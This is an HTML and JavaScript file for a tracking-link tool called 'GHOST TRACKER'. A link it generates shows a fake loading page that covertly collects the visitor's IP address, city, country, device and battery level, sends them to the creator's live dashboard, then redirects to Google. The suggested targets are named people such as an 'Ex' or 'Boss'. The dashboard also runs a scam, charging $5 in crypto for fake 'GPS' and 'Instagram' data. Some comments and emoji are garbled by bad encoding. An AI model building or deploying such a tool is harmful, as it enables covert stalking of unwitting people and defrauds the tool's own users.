<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GHOST_PROTOCOL_V6</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #020202; --panel: #0d0d0d; --green: #00ff41; --red: #ff0055; --dim: #444; }
        body { background-color: var(--bg); color: var(--green); font-family: 'Share Tech Mono', monospace; margin: 0; padding: 0; overflow-x: hidden; }
        
        /* VICTIM VIEW */
        #victim-view { display: none; height: 100vh; background: #fff; color: #333; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { width: 40px; height: 40px; border: 4px solid #ddd; border-top: 4px solid #333; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px;}
        
        /* DASHBOARD VIEW */
        #dashboard-view { display: none; padding: 15px; max-width: 600px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--dim); padding-bottom: 15px; margin-bottom: 20px;}
        .logo { font-size: 22px; letter-spacing: 1px; color: #fff; }
        .id-badge { background: #111; padding: 5px 10px; border-radius: 4px; color: var(--dim); font-size: 10px; border: 1px solid var(--dim);}

        /* GENERATOR CARD */
        .card { background: var(--panel); border: 1px solid var(--dim); padding: 15px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
        .card-title { color: #fff; font-size: 13px; margin-bottom: 10px; display: block; text-transform: uppercase;}
        
        .input-group { display: flex; flex-direction: column; gap: 8px; }
        input { background: #000; border: 1px solid var(--dim); color: #fff; padding: 12px; border-radius: 5px; font-family: inherit; font-size: 13px; outline: none;}
        input:focus { border-color: var(--green); }
        
        .btn { background: var(--green); color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 13px; transition: 0.2s;}
        .btn:active { transform: scale(0.98); }

        /* LOGS */
        #logs-container { display: flex; flex-direction: column; gap: 10px; }
        .log-item { background: #080808; border-left: 3px solid var(--red); padding: 15px; border-radius: 4px; animation: slideIn 0.4s ease-out; position: relative;}
        
        .target-name { color: var(--red); font-size: 14px; font-weight: bold; margin-bottom: 8px; display: block; text-transform: uppercase; letter-spacing: 1px;}
        
        .data-row { display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 4px; color: #aaa;}
        .val { color: #fff; }
        .val-lock { color: var(--red); filter: blur(4px); user-select: none; }
        
        .map-btn { width: 100%; background: #111; color: var(--green); border: 1px dashed var(--green); padding: 8px; margin-top: 10px; cursor: pointer; font-size: 11px; border-radius: 4px;}
        .map-btn:hover { background: var(--green); color: #000; }

        /* MODAL */
        #payModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .pay-box { background: #000; border: 1px solid var(--green); padding: 25px; width: 85%; max-width: 320px; text-align: center; border-radius: 10px; box-shadow: 0 0 40px rgba(0, 255, 65, 0.2); }
        .pay-addr { background: #111; color: #fff; padding: 10px; font-size: 9px; margin: 15px 0; border: 1px solid #333; word-break: break-all; font-family: monospace; border-radius: 4px; user-select: all;}

        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <!-- 1. VICTIM VIEW -->
    <div id="victim-view">
        <div class="spinner"></div>
        <p style="font-size:12px; color:#666;">Loading content...</p>
    </div>

    <!-- 2. HACKER DASHBOARD -->
    <div id="dashboard-view">
        <div class="header">
            <div class="logo">GHOST<span style="color:var(--dim)">TRACKER</span></div>
            <div class="id-badge" id="myIdDisplay">ID: ...</div>
        </div>

        <!-- GENERATOR -->
        <div class="card">
            <span class="card-title">üéØ CREATE NEW TRAP</span>
            <div class="input-group">
                <input type="text" id="victimName" placeholder="Enter Victim Name (e.g. Ali, Ex, Boss)...">
                <button class="btn" onclick="generateLink()">GENERATE TRACKING LINK</button>
                
                <div id="resultArea" style="display:none; margin-top:10px;">
                    <input type="text" id="finalLink" readonly style="color:yellow; border-color:yellow;">
                    <button class="btn" onclick="copyLink()" style="background:#222; color:#fff; border:1px solid #555; margin-top:5px;">COPY LINK</button>
                </div>
            </div>
        </div>

        <!-- LOGS -->
        <div class="card" style="background:transparent; border:none; padding:0; box-shadow:none;">
            <span class="card-title">üì° LIVE CAPTURES</span>
            <div id="logs-container">
                <p style="text-align:center; font-size:11px; color:#333; padding:20px;" id="waiting-msg">Waiting for clicks...</p>
            </div>
        </div>
    </div>

    <!-- PAYMENT MODAL -->
    <div id="payModal">
        <div class="pay-box">
            <h2 style="color: var(--green); margin:0 0 10px 0;">UNLOCK GPS DATA</h2>
            <p style="font-size: 11px; color: #ccc; line-height: 1.5;">
                Exact Address, Instagram ID, and Gallery Access requires Premium Decryption.
            </p>
            <p style="font-size: 24px; font-weight: bold; margin: 15px 0; color: #fff;">$5.00</p>
            <p style="font-size: 10px; color: #666; margin-bottom: 5px;">Send SOL/USDC to:</p>
            <div class="pay-addr">4jtjysarsDeReyKe1sjWJmSDbjFKqM23ReEN3b9GV7LU</div>
            <button class="btn" style="width:100%" onclick="confirmUnlock()">I PAID - SHOW MAP</button>
            <p style="font-size: 10px; color: #444; margin-top: 15px; cursor: pointer;" onclick="closeModal()">Close</p>
        </div>
    </div>

    <audio id="alertSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const urlParams = new URLSearchParams(window.location.search);
        const trapID = urlParams.get('id'); 
        const victimTag = urlParams.get('n'); // ÿßÿ≥ŸÖ ŸÇÿ±ÿ®ÿßŸÜ€å

        // --- VICTIM LOGIC ---
        if (trapID) {
            document.getElementById('victim-view').style.display = 'flex';
            
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    const info = {
                        linkID: trapID,
                        victimName: victimTag || 'Unknown', // ÿßÿ±ÿ≥ÿßŸÑ ÿßÿ≥ŸÖ ŸÇÿ±ÿ®ÿßŸÜ€å ÿ®Ÿá ÿ≥ÿ±Ÿàÿ±
                        ip: data.ip,
                        city: data.city,
                        country: data.country_name,
                        device: navigator.platform,
                        battery: '...'
                    };
                    
                    if(navigator.getBattery) {
                        navigator.getBattery().then(batt => {
                            info.battery = Math.round(batt.level * 100) + '%';
                            socket.emit('victim-data', info);
                        });
                    } else {
                        socket.emit('victim-data', info);
                    }

                    setTimeout(() => { window.location.href = 'https://google.com'; }, 1500);
                })
                .catch(err => {
                    socket.emit('victim-data', { linkID: trapID, victimName: victimTag, ip: 'Hidden', city: 'Unknown', device: 'Mobile', battery: '?' });
                });

        } 
        // --- DASHBOARD LOGIC ---
        else {
            document.getElementById('dashboard-view').style.display = 'block';
            
            let myID = localStorage.getItem('ghost_id');
            if (!myID) {
                myID = Math.floor(Math.random() * 1000000);
                localStorage.setItem('ghost_id', myID);
            }
            document.getElementById('myIdDisplay').innerText = "ID: " + myID;
            socket.emit('login-dashboard', myID.toString());
        }

        // Generate Custom Link
        function generateLink() {
            const name = document.getElementById('victimName').value;
            if(!name) return alert("Please enter a name for the victim!");
            
            const myID = localStorage.getItem('ghost_id');
            // ŸÑ€åŸÜ⁄© ÿ¥ÿßŸÖŸÑ ÿßÿ≥ŸÖ ŸÇÿ±ÿ®ÿßŸÜ€å ŸáŸÖ Ÿáÿ≥ÿ™
            const link = window.location.origin + "/?id=" + myID + "&n=" + encodeURIComponent(name);
            
            document.getElementById('finalLink').value = link;
            document.getElementById('resultArea').style.display = 'block';
        }

        function addLog(data) {
            document.getElementById('waiting-msg').style.display = 'none';
            const container = document.getElementById('logs-container');
            if(document.getElementById(`log-${data.id}`)) return;

            // ÿßÿ≥ŸÖ ŸÇÿ±ÿ®ÿßŸÜ€å ÿ±Ÿà ÿßÿ≤ ÿØ€åÿ™ÿß€å ÿØÿ±€åÿßŸÅÿ™€å ŸÖ€å⁄Ø€åÿ±Ÿá
            const targetName = data.victimName ? decodeURIComponent(data.victimName) : 'Unknown Target';

            const div = document.createElement('div');
            div.className = 'log-item';
            div.id = `log-${data.id}`;
            div.innerHTML = `
                <span class="target-name">üéØ TARGET: ${targetName}</span>
                <div class="data-row"><span class="label">TIME:</span> <span class="val">${data.time}</span></div>
                <div class="data-row"><span class="label">DEVICE:</span> <span class="val">${data.device}</span></div>
                <div class="data-row"><span class="label">CITY:</span> <span class="val">${data.city}</span></div>
                <div class="data-row"><span class="label">BATTERY:</span> <span class="val">${data.battery}</span></div>
                
                <div style="margin-top:8px; padding-top:8px; border-top:1px dashed #333;">
                    <div class="data-row"><span class="label">INSTAGRAM:</span> <span class="val-lock">DETECTED</span></div>
                    <div class="data-row"><span class="label">GPS:</span> <span class="val-lock">PRECISE</span></div>
                </div>

                <button class="map-btn" onclick="openPay()">üìç VIEW EXACT LOCATION & DATA ($5)</button>
            `;
            container.prepend(div);
        }

        socket.on('new-capture', (data) => {
            addLog(data);
            document.getElementById('alertSound').play().catch(()=>{});
        });

        socket.on('load-history', (history) => history.forEach(item => addLog(item)));

        function copyLink() {
            const copyText = document.getElementById("finalLink");
            copyText.select();
            document.execCommand("copy");
            alert("LINK COPIED!");
        }

        function openPay() { document.getElementById('payModal').style.display = 'flex'; }
        function closeModal() { document.getElementById('payModal').style.display = 'none'; }
        function confirmUnlock() { alert("Request sent to server."); closeModal(); }
    </script>
</body>
</html>
